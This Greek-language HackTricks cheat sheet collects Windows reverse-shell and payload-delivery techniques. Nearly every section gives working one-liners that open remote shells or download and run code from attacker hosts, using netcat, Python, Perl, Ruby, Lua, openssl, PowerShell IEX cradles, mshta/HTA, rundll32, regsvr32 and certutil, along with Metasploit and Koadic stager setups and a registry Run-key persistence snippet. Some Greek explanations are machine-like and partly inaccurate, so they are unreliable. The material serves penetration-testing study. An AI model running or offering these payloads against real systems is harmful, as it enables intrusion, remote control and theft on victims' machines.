# Shells - Windows

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Βρείτε ευπάθειες που έχουν μεγαλύτερη σημασία, ώστε να μπορείτε να τις διορθώσετε πιο γρήγορα. Το Intruder παρακολουθεί την επιθετική επιφάνεια σας, εκτελεί προληπτικές απειλητικές αναζητήσεις, εντοπίζει προβλήματα σε ολόκληρο το τεχνολογικό σας στοίχημα, από APIs έως web εφαρμογές και συστήματα στο cloud. [**Δοκιμάστε το δωρεάν**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) σήμερα.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Lolbas

Η σελίδα [lolbas-project.github.io](https://lolbas-project.github.io/) είναι για τα Windows όπως το [https://gtfobins.github.io/](https://gtfobins.github.io/) είναι για το linux.\
Φυσικά, **δεν υπάρχουν αρχεία SUID ή δικαιώματα sudo στα Windows**, αλλά είναι χρήσιμο να γνωρίζετε **πώς** μερικά **εκτελέσιμα αρχεία** μπορούν να (κατ)χρησιμοποιηθούν για να εκτελέσουν κάποιες απροσδόκητες ενέργειες όπως **εκτέλεση αυθαίρετου κώδικα**.
```bash
nc.exe -e cmd.exe <Attacker_IP> <PORT>
```
## SBD

**[sbd](https://www.kali.org/tools/sbd/) είναι μια φορητή και ασφαλής εναλλακτική λύση για το Netcat**. Λειτουργεί σε συστήματα παρόμοια με Unix και Win32. Με χαρακτηριστικά όπως ισχυρή κρυπτογράφηση, εκτέλεση προγραμμάτων, προσαρμοζόμενες πηγές θυρών και συνεχή επανασύνδεση, το sbd παρέχει μια ευέλικτη λύση για την επικοινωνία TCP/IP. Για τους χρήστες των Windows, η έκδοση sbd.exe από τη διανομή Kali Linux μπορεί να χρησιμοποιηθεί ως αξιόπιστη αντικατάσταση για το Netcat.
```bash
# Victims machine
sbd -l -p 4444 -e bash -v -n
listening on port 4444


# Atackers
sbd 10.10.10.10 4444
id
uid=0(root) gid=0(root) groups=0(root)
```
## Πυθώνας

Ο Πυθώνας είναι μια δημοφιλής γλώσσα προγραμματισμού που χρησιμοποιείται ευρέως για την ανάπτυξη εφαρμογών και σεναρίων. Είναι εύκολο να μάθετε και να χρησιμοποιήσετε, και παρέχει πολλές βιβλιοθήκες και εργαλεία που μπορούν να χρησιμοποιηθούν για την εκτέλεση διαφόρων εργασιών.

### Εκτέλεση εντολών και κώδικα

Μπορείτε να εκτελέσετε εντολές και κώδικα Python από το κέλυφος των Windows. Αυτό μπορεί να γίνει με τη χρήση της εντολής `python` ή `python3`. Για παράδειγμα:

```shell
python -c "print('Hello, World!')"
```

### Απόκτηση αντικειμένου `os`

Για να αποκτήσετε πρόσβαση σε λειτουργίες του λειτουργικού συστήματος, μπορείτε να εισάγετε το αντικείμενο `os`. Αυτό σας επιτρέπει να εκτελέσετε εντολές του κελύφους, να αλληλεπιδράσετε με το σύστημα αρχείων και να εκτελέσετε άλλες λειτουργίες του λειτουργικού συστήματος. Για παράδειγμα:

```python
import os

os.system("whoami")
```

### Απόκτηση αντικειμένου `subprocess`

Το αντικείμενο `subprocess` σας επιτρέπει να εκτελέσετε εντολές του κελύφους και να αλληλεπιδράσετε με την έξοδο και την είσοδο τους. Μπορείτε να το χρησιμοποιήσετε για να εκτελέσετε εντολές και να λάβετε την έξοδο τους στην Python. Για παράδειγμα:

```python
import subprocess

output = subprocess.check_output("ipconfig /all", shell=True)
print(output)
```

### Απόκτηση αντικειμένου `winreg`

Το αντικείμενο `winreg` σας επιτρέπει να αλληλεπιδράσετε με το Μητρώο των Windows. Μπορείτε να το χρησιμοποιήσετε για να διαβάσετε, να γράψετε και να διαγράψετε τιμές από το Μητρώο. Για παράδειγμα:

```python
import winreg

key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_ALL_ACCESS)
winreg.SetValueEx(key, "MaliciousProgram", 0, winreg.REG_SZ, "C:\\path\\to\\malicious.exe")
winreg.CloseKey(key)
```

### Απόκτηση αντικειμένου `ctypes`

Το αντικείμενο `ctypes` σας επιτρέπει να καλέσετε συναρτήσεις από κοινόχρηστες βιβλιοθήκες του Windows. Μπορείτε να το χρησιμοποιήσετε για να καλέσετε συναρτήσεις όπως η `LoadLibrary` και η `GetProcAddress` για να φορτώσετε και να εκτελέσετε δυναμικές βιβλιοθήκες. Για παράδειγμα:

```python
import ctypes

kernel32 = ctypes.WinDLL("kernel32")
kernel32.LoadLibraryA("user32")
```

### Απόκτηση αντικειμένου `pywin32`

Το αντικείμενο `pywin32` είναι μια βιβλιοθήκη που παρέχει πρόσβαση σε πολλές λειτουργίες των Windows μέσω της Python. Μπορείτε να το χρησιμοποιήσετε για να αλληλεπιδράσετε με το σύστημα αρχείων, το Μητρώο, τον κατάλογο των διεργασιών και πολλά άλλα. Για παράδειγμα:

```python
import win32api

win32api.MessageBox(0, "Hello, World!", "Message")
```
```bash
#Windows
C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.11.0.37', 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
```
## Perl

Perl είναι μια δυναμική γλώσσα προγραμματισμού που χρησιμοποιείται ευρέως για την αυτοματοποίηση διαδικασιών και την επεξεργασία κειμένου. Έχει ισχυρές δυνατότητες για την επεξεργασία αρχείων και την διαχείριση συστήματος. Μπορεί να χρησιμοποιηθεί για την ανάπτυξη εργαλείων hacking και για την εκτέλεση επιθέσεων.

Για να εκτελέσετε ένα Perl script σε ένα σύστημα Windows, μπορείτε να χρησιμοποιήσετε τον ερμηνευτή Perl που είναι διαθέσιμος για λήψη από την επίσημη ιστοσελίδα της Perl. Μετά την εγκατάσταση, μπορείτε να εκτελέσετε το script χρησιμοποιώντας την εντολή `perl script.pl`, όπου `script.pl` είναι το όνομα του αρχείου Perl script που θέλετε να εκτελέσετε.

Για να εκτελέσετε ένα Perl script από μια κακόβουλη πηγή, μπορείτε να χρησιμοποιήσετε μια εντολή εκτέλεσης στο command prompt του Windows. Για παράδειγμα, μπορείτε να χρησιμοποιήσετε την εντολή `perl -e "system('command')"`, όπου `command` είναι η εντολή που θέλετε να εκτελέσετε.

Επίσης, μπορείτε να χρησιμοποιήσετε την Perl για να δημιουργήσετε ένα reverse shell σε ένα σύστημα Windows. Μπορείτε να χρησιμοποιήσετε την εντολή `perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"ATTACKER_IP:ATTACKER_PORT");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'`, αντικαθιστώντας την `ATTACKER_IP` με την διεύθυνση IP του επιτιθέμενου και την `ATTACKER_PORT` με την θύρα που θέλετε να χρησιμοποιήσετε για την σύνδεση.

Αυτές είναι μερικές από τις βασικές χρήσεις της Perl στο πεδίο του hacking. Μπορείτε να εξερευνήσετε περισσότερες δυνατότητες και τεχνικές χρησιμοποιώντας την Perl για να εκτελέσετε επιθέσεις και να αναπτύξετε εργαλεία hacking.
```bash
perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
## Ruby

Ruby είναι μια δημοφιλής γλώσσα προγραμματισμού που χρησιμοποιείται ευρέως για την ανάπτυξη εφαρμογών. Έχει μια ευανάγνωστη σύνταξη και παρέχει πολλές χρήσιμες βιβλιοθήκες και πλαίσια για την επεξεργασία δεδομένων και την ανάπτυξη ιστοσελίδων.

Για να εκτελέσετε κώδικα Ruby σε ένα σύστημα Windows, μπορείτε να χρησιμοποιήσετε το περιβάλλον εκτέλεσης Ruby (Ruby runtime environment) και το πρόγραμμα εκτέλεσης Ruby (Ruby interpreter). Μπορείτε να κατεβάσετε το περιβάλλον εκτέλεσης Ruby από την επίσημη ιστοσελίδα του Ruby και να το εγκαταστήσετε στο σύστημά σας.

Αφού εγκαταστήσετε το περιβάλλον εκτέλεσης Ruby, μπορείτε να ανοίξετε ένα παράθυρο εντολών (command prompt) και να εκτελέσετε το πρόγραμμα εκτέλεσης Ruby για να εκτελέσετε τον κώδικά σας. Μπορείτε να γράψετε τον κώδικά σας σε ένα αρχείο με κατάληξη `.rb` και να το εκτελέσετε χρησιμοποιώντας την εντολή `ruby filename.rb`.

Με τη βοήθεια της Ruby, μπορείτε να αναπτύξετε εφαρμογές, να επεξεργαστείτε δεδομένα και να αυτοματοποιήσετε διάφορες εργασίες. Είναι μια ισχυρή γλώσσα προγραμματισμού που προσφέρει πολλές δυνατότητες και εργαλεία για τους προγραμματιστές.
```bash
#Windows
ruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
## Lua

Lua είναι μια δημοφιλής γλώσσα προγραμματισμού σε σενάρια που χρησιμοποιείται ευρέως για την ανάπτυξη εφαρμογών και παιχνιδιών. Έχει απλή σύνταξη και είναι ευέλικτη και επεκτάσιμη. Η Lua χρησιμοποιείται συχνά για την ενσωμάτωση σε άλλες εφαρμογές και προγράμματα, καθώς παρέχει έναν ελαφρύ και γρήγορο τρόπο για την εκτέλεση σεναρίων.

Για να εκτελέσετε ένα σενάριο Lua σε ένα σύστημα Windows, μπορείτε να χρησιμοποιήσετε το πρόγραμμα εκτέλεσης Lua (lua.exe) που παρέχεται με την εγκατάσταση της γλώσσας Lua. Μπορείτε να εκτελέσετε ένα σενάριο Lua από τη γραμμή εντολών χρησιμοποιώντας την εντολή `lua script.lua`, όπου `script.lua` είναι το όνομα του σεναρίου που θέλετε να εκτελέσετε.

Επιπλέον, μπορείτε να εκτελέσετε ένα σενάριο Lua από ένα περιβάλλον ανάπτυξης όπως το ZeroBrane Studio ή το LuaEdit. Αυτά τα περιβάλλοντα παρέχουν πρόσθετες δυνατότητες όπως αυτόματη συμπλήρωση κώδικα, αποσφαλμάτωση και οπτική ανάλυση του κώδικα Lua.

Για να εκτελέσετε ένα σενάριο Lua από ένα πρόγραμμα C++, μπορείτε να χρησιμοποιήσετε τη βιβλιοθήκη Lua (Lua library) για να ενσωματώσετε τη γλώσσα Lua στο πρόγραμμά σας. Αυτό σας επιτρέπει να καλέσετε συναρτήσεις Lua και να αλληλεπιδράσετε με το περιβάλλον Lua από το πρόγραμμά σας.

Για περισσότερες πληροφορίες σχετικά με τη γλώσσα Lua και τον τρόπο εκτέλεσης σεναρίων Lua, μπορείτε να ανατρέξετε στην επίσημη τεκμηρίωση της Lua στη διεύθυνση [lua.org](https://www.lua.org/).
```bash
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
## OpenSSH

Επιτιθέμενος (Kali)
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
```
Θύμα
```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```
## Powershell

Ο Powershell είναι μια ισχυρή γλώσσα σεναρίων και περιβάλλον εκτέλεσης που χρησιμοποιείται ευρέως στα Windows συστήματα για την αυτοματοποίηση και τη διαχείριση των λειτουργιών του συστήματος. Με το Powershell, μπορείτε να εκτελέσετε εντολές, να διαχειριστείτε αρχεία και φακέλους, να διαχειριστείτε δίκτυα και να εκτελέσετε πολλές άλλες εργασίες.

Οι επιθέσεις Powershell είναι δημοφιλείς στον κόσμο του hacking, καθώς οι επιτιθέμενοι μπορούν να χρησιμοποιήσουν το Powershell για να εκτελέσουν κακόβουλο κώδικα σε έναν στόχο. Οι επιθέσεις Powershell μπορούν να είναι δύσκολο να ανιχνευθούν, καθώς ο κώδικας Powershell μπορεί να είναι κρυμμένος και να αποφεύγει την ανίχνευση από τα αντι-virus.

Για να εκτελέσετε εντολές Powershell από τη γραμμή εντολών των Windows, απλά πληκτρολογήστε `powershell` και πατήστε Enter. Αυτό θα σας εισάγει στο περιβάλλον Powershell, όπου μπορείτε να εκτελέσετε τις εντολές σας.

Για να εκτελέσετε ένα Powershell script από τη γραμμή εντολών, χρησιμοποιήστε την εντολή `powershell -File <path_to_script>`. Αυτό θα εκτελέσει το σενάριο Powershell που βρίσκεται στην καθορισμένη διαδρομή αρχείου.

Για να εκτελέσετε ένα Powershell script από ένα άλλο Powershell script, χρησιμοποιήστε την εντολή `& <path_to_script>`. Αυτό θα εκτελέσει το σενάριο Powershell που βρίσκεται στην καθορισμένη διαδρομή αρχείου.

Ο Powershell παρέχει επίσης πολλές εντολές και λειτουργίες που μπορούν να χρησιμοποιηθούν για την εκτέλεση επιθέσεων. Οι επιθέσεις Powershell μπορούν να περιλαμβάνουν την εκτέλεση κακόβουλων εντολών, την ανάκτηση ευαίσθητων πληροφοριών και την εκμετάλλευση ευπάθειών του συστήματος.

Είναι σημαντικό να είστε προσεκτικοί κατά την εκτέλεση εντολών Powershell, καθώς μπορεί να προκαλέσουν σοβαρές ζημιές στο σύστημα σας ή στον στόχο σας. Πάντα επιβεβαιώνετε τις εντολές πριν τις εκτελέσετε και χρησιμοποιείτε τις επιθέσεις Powershell με προσοχή και ευθύνη.
```bash
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')"
Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadString('http://10.222.0.26:8000/ipst.ps1')"
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
```
Διεργασία που εκτελεί δικτυακή κλήση: **powershell.exe**\
Φορτίο που εγγράφεται στον δίσκο: **ΟΧΙ** (_τουλάχιστον όπου και αν αναζήτησα χρησιμοποιώντας το procmon!_)
```bash
powershell -exec bypass -f \\webdavserver\folder\payload.ps1
```
Διεργασία που εκτελεί δίκτυα κλήση: **svchost.exe**\
Φορτίο που εγγράφεται στον δίσκο: **Τοπική μνήμη πελάτη WebDAV**
```bash
$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
**Λάβετε περισσότερες πληροφορίες για διάφορα Powershell Shells στο τέλος αυτού του εγγράφου**

## Mshta

* [Από εδώ](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
```bash
mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
```

```bash
mshta http://webserver/payload.hta
```

```bash
mshta \\webdavserver\folder\payload.hta
```
#### **Παράδειγμα αντίστροφου κελύφους hta-psh (χρήση hta για να κατεβάσει και να εκτελέσει την πίσω πόρτα PS)**
```xml
<scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
```
**Μπορείτε να κατεβάσετε και να εκτελέσετε πολύ εύκολα ένα Koadic zombie χρησιμοποιώντας το stager hta**

#### παράδειγμα hta

[**Από εδώ**](https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f)
```xml
<html>
<head>
<HTA:APPLICATION ID="HelloExample">
<script language="jscript">
var c = "cmd.exe /c calc.exe";
new ActiveXObject('WScript.Shell').Run(c);
</script>
</head>
<body>
<script>self.close();</script>
</body>
</html>
```
#### **mshta - sct**

[**Από εδώ**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
```xml
<?XML version="1.0"?>
<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:C:\local\path\scriptlet.sct"")")) -->
<scriptlet>
<public>
</public>
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</scriptlet>
```
#### **Mshta - Metasploit**

Η εκτέλεση του `mshta` είναι μια τεχνική που χρησιμοποιείται στο Metasploit για να εκτελέσει κακόβουλο κώδικα μέσω του HTML Application Host (mshta.exe) σε συστήματα Windows. Αυτή η τεχνική επιτρέπει στον επιτιθέμενο να εκτελέσει κώδικα PowerShell ή VBScript μέσω ενός αρχείου HTA (HTML Application).

Για να χρησιμοποιήσετε αυτήν την τεχνική, μπορείτε να χρησιμοποιήσετε την εντολή `exploit/windows/browser/mshta` στο Metasploit framework. Αυτή η εντολή δημιουργεί έναν κακόβουλο ιστότοπο HTA που περιέχει τον κώδικα που θέλετε να εκτελέσετε. Όταν ο στόχος ανοίγει τον ιστότοπο, ο κακόβουλος κώδικας εκτελείται αυτόματα μέσω του mshta.exe.

Αυτή η τεχνική είναι χρήσιμη για την εκτέλεση κακόβουλων εντολών σε ένα σύστημα χωρίς την ανάγκη για εκτέλεση αρχείων με κακόβουλο κώδικα. Επίσης, μπορεί να χρησιμοποιηθεί για την παράκαμψη των μέτρων ασφαλείας που απαγορεύουν την εκτέλεση εκτελέσιμων αρχείων.
```bash
use exploit/windows/misc/hta_server
msf exploit(windows/misc/hta_server) > set srvhost 192.168.1.109
msf exploit(windows/misc/hta_server) > set lhost 192.168.1.109
msf exploit(windows/misc/hta_server) > exploit
```

```bash
Victim> mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta #The file name is given in the output of metasploit
```
**Ανιχνεύθηκε από τον defender**




## **Rundll32**

[**Παράδειγμα Dll hello world**](https://github.com/carterjones/hello-world-dll)

* [Από εδώ](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
```bash
rundll32 \\webdavserver\folder\payload.dll,entrypoint
```

```bash
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
```
**Ανιχνεύθηκε από τον defender**

**Rundll32 - sct**

[**Από εδώ**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
```xml
<?XML version="1.0"?>
<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
<scriptlet>
<public>
</public>
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</scriptlet>
```
#### **Rundll32 - Metasploit**

Ο Rundll32 είναι ένα εργαλείο των Windows που επιτρέπει την εκτέλεση των συναρτήσεων που περιέχονται σε ένα DLL αρχείο. Μπορεί να χρησιμοποιηθεί και ως μέθοδος για την εκτέλεση κακόβουλου κώδικα. Ο Metasploit παρέχει μια εντολή για την εκτέλεση κακόβουλου κώδικα μέσω του Rundll32.

Για να εκτελέσετε κακόβουλο κώδικα μέσω του Rundll32 με το Metasploit, μπορείτε να χρησιμοποιήσετε την εντολή `exploit/windows/local/hta_print_uaf`. Αυτή η εντολή εκτελεί έναν κακόβουλο κώδικα που εκμεταλλεύεται μια ευπάθεια στον Internet Explorer για να εκτελέσει τον κακόβουλο κώδικα μέσω του Rundll32.

Για να χρησιμοποιήσετε αυτήν την εντολή, ακολουθήστε τα εξής βήματα:

1. Εκτελέστε το Metasploit Framework.
2. Χρησιμοποιήστε την εντολή `use exploit/windows/local/hta_print_uaf` για να επιλέξετε την επίθεση.
3. Ρυθμίστε τις απαιτούμενες παραμέτρους, όπως τη διεύθυνση IP και τη θύρα.
4. Χρησιμοποιήστε την εντολή `exploit` για να ξεκινήσετε την επίθεση.
5. Αν η επίθεση είναι επιτυχής, θα εκτελεστεί ο κακόβουλος κώδικας μέσω του Rundll32.

Είναι σημαντικό να σημειωθεί ότι η χρήση του Rundll32 για την εκτέλεση κακόβουλου κώδικα είναι παράνομη και ανήθικη. Πρέπει να τηρούνται όλοι οι νόμοι και οι κανόνες που διέπουν την χρήση των υπολογιστών και των δικτύων.
```bash
use windows/smb/smb_delivery
run
#You will be given the command to run in the victim: rundll32.exe \\10.2.0.5\Iwvc\test.dll,0
```
**Rundll32 - Koadic**

Ο Rundll32 είναι ένα εργαλείο των Windows που επιτρέπει την εκτέλεση ενός DLL αρχείου ως μια εντολή. Ο Koadic είναι ένα εργαλείο απομακρυσμένης διαχείρισης που χρησιμοποιεί το Rundll32 για να εκτελέσει κακόβουλο κώδικα σε έναν στόχο.

Για να χρησιμοποιήσετε το Rundll32 με το Koadic, ακολουθήστε τα παρακάτω βήματα:

1. Κατεβάστε το Koadic από το αποθετήριο του στο GitHub.
2. Ανεβάστε το Koadic στον στόχο σας, για παράδειγμα, με τη χρήση του Rundll32.
3. Εκτελέστε το Koadic με την εντολή `rundll32.exe <path_to_koadic_dll>,<entry_point>`.
4. Ο Koadic θα ξεκινήσει και θα περιμένει για συνδέσεις από τον επιτιθέμενο.

Με τη χρήση του Rundll32 και του Koadic, μπορείτε να εκτελέσετε κακόβουλο κώδικα σε έναν στόχο και να αποκτήσετε απομακρυσμένη πρόσβαση στο σύστημα του. Αυτή η τεχνική μπορεί να χρησιμοποιηθεί για ποικίλους σκοπούς, όπως η εξερεύνηση του συστήματος, η κλοπή δεδομένων ή η εκτέλεση εντολών στον στόχο.
```bash
use stager/js/rundll32_js
set SRVHOST 192.168.1.107
set ENDPOINT sales
run
#Koadic will tell you what you need to execute inside the victim, it will be something like:
rundll32.exe javascript:"\..\mshtml, RunHTMLApplication ";x=new%20ActiveXObject("Msxml2.ServerXMLHTTP.6.0");x.open("GET","http://10.2.0.5:9997/ownmG",false);x.send();eval(x.responseText);window.close();
```
## Regsvr32

* [Από εδώ](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
```bash
regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
```

```
regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
```
**Ανιχνεύθηκε από τον defender**

#### Regsvr32 -sct

[**Από εδώ**](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1)
```markup
<?XML version="1.0"?>
<!-- regsvr32 /u /n /s /i:http://webserver/regsvr32.sct scrobj.dll -->
<!-- regsvr32 /u /n /s /i:\\webdavserver\folder\regsvr32.sct scrobj.dll -->
<scriptlet>
<registration
progid="PoC"
classid="{10001111-0000-0000-0000-0000FEEDACDC}" >
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</registration>
</scriptlet>
```
#### **Regsvr32 - Metasploit**

Ο Regsvr32 είναι ένα εργαλείο των Windows που χρησιμοποιείται για την εγγραφή και απεγγραφή DLL αρχείων. Ωστόσο, μπορεί επίσης να χρησιμοποιηθεί ως μέθοδος εκτέλεσης κακόβουλου κώδικα με τη χρήση του Metasploit.

Για να εκτελέσετε κακόβουλο κώδικα με το Regsvr32 και το Metasploit, ακολουθήστε τα παρακάτω βήματα:

1. Δημιουργήστε ένα κακόβουλο DLL αρχείο με το Metasploit Framework.
2. Ανεβάστε το κακόβουλο DLL αρχείο σε έναν διακομιστή HTTP.
3. Εκτελέστε την εντολή `regsvr32 /s /n /u /i:http://<διακομιστής>/<κακόβουλο_αρχείο>.dll` στον στόχο.
4. Ο στόχος θα κατεβάσει το κακόβουλο DLL αρχείο από τον διακομιστή HTTP και θα το εκτελέσει.

Αυτή η τεχνική εκμεταλλεύεται την ευπάθεια του Regsvr32 να εκτελεί κακόβουλο κώδικα και μπορεί να χρησιμοποιηθεί για να αποκτήσετε πρόσβαση σε ένα σύστημα Windows.
```bash
use multi/script/web_delivery
set target 3
set payload windows/meterpreter/reverse/tcp
set lhost 10.2.0.5
run
#You will be given the command to run in the victim: regsvr32 /s /n /u /i:http://10.2.0.5:8080/82j8mC8JBblt.sct scrobj.dll
```
**Μπορείτε να κατεβάσετε και να εκτελέσετε πολύ εύκολα ένα Koadic zombie χρησιμοποιώντας το stager regsvr**

## Certutil

* [Από εδώ](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)

Κατεβάστε ένα B64dll, αποκωδικοποιήστε το και εκτελέστε το.
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
```
Κατεβάστε ένα B64exe, αποκωδικοποιήστε το και εκτελέστε το.
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
```
**Ανιχνεύθηκε από τον defender**


<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

